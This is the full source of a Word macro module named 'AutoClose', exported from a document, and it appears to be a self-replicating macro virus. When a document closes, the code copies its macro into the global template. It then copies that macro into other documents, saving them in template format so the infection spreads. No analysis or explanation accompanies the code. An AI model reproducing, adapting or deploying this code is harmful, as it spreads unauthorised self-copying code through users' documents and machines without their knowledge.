   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim total
   Dim present
   Dim cycle
   Dim a$
   total = WordBasic.CountMacros(0)
   present = 0

   If total > 0 Then
       For cycle = 1 To total
           If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
               present = 1
           End If
   'End If

   a$ = WordBasic.[WindowName$]() + ":AutoClose"

   If present <> 1 Then
       WordBasic.MacroCopy a$, "Global:AutoClose"
   Else
       present = 0
       If WordBasic.CountMacros(1) <> 0 Then
           present = 1
       End If

       If present = 0 Then
           WordBasic.FileSaveAs Format:=1
           WordBasic.MacroCopy "Global:AutoClose", a$
       End If
   End If

   WordBasic.FileSave

   Next
   End If
   End Sub
